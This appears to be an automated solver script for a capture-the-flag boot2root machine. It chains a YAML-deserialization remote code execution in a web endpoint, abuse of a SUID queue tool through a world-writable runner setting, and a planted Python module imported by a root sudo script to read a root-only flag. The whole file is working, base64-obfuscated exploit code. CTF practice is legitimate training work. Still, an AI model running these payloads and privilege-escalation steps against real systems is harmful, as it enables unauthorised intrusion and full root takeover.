#!/usr/bin/env bash
# Automated end-to-end solver for boot2root-c2 (Phantom Wire staging server).
#
# Drives the whole privesc chain purely through the HTTP YAML-deserialization
# RCE at POST /api/queue (no interactive shell, no outbound connection needed):
#
#   unsafe yaml.load (www)  ->  SUID queuectl world-writable runner= (deploy)
#                           ->  sudo python3 report.py + planted phantomlib (root)
#                           ->  copy /root/flag to a www-readable path -> read it
#
# Usage: ./solve.sh http://HOST:PORT
set -euo pipefail

BASE="${1:?usage: solve.sh http://HOST:PORT}"
BASE="${BASE%/}"

# rce CMD -- run CMD (as www) via the YAML full-loader gadget and echo the raw
# reflected response. subprocess.check_output([...]) output is str()'d into the
# page, so NCTF{...} survives verbatim and callers can grep the raw body.
rce() {
    local manifest
    manifest="!!python/object/apply:subprocess.check_output [[\"sh\",\"-c\",\"$1\"]]"
    curl -s -m 15 -X POST "$BASE/api/queue" --data-binary "$manifest"
}

# --- deploy-side script: run AS deploy by queuectl. Plants a phantomlib.py in
# the group-writable /opt/phantom so the root sudo-run of report.py imports it
# and copies the root-only flag somewhere www can read. ----------------------
read -r -d '' WWW <<'EOF' || true
umask 022
cat > /tmp/pwn.sh <<'SH'
cat > /opt/phantom/phantomlib.py <<'PY'
import os
os.system("cp /root/flag /dev/shm/loot; chmod 644 /dev/shm/loot")
def summary():
    return "ok"
PY
sudo -n /usr/bin/python3 /opt/phantom/report.py >/dev/null 2>&1
SH
printf 'runner=/tmp/pwn.sh\n' > /etc/phantom/queue.conf
rm -f /dev/shm/loot
/usr/local/bin/queuectl >/dev/null 2>&1
EOF
WWW_B64="$(printf '%s' "$WWW" | base64 | tr -d '\n')"

echo "[*] firing chain through /api/queue YAML RCE ..." >&2
rce "echo ${WWW_B64} | base64 -d | sh" >/dev/null || true

echo "[*] reading /dev/shm/loot ..." >&2
FLAG=""
for i in 1 2 3 4 5 6; do
    sleep 1
    OUT="$(rce 'cat /dev/shm/loot 2>/dev/null' || true)"
    FLAG="$(printf '%s' "$OUT" | grep -oE 'NCTF\{[^}]*\}' | head -n1 || true)"
    [ -n "$FLAG" ] && break
done
if [ -n "$FLAG" ]; then
    echo "[+] flag: $FLAG"
else
    echo "[-] no flag recovered; last /api/queue response:" >&2
    printf '%s\n' "$OUT" >&2
    exit 1
fi
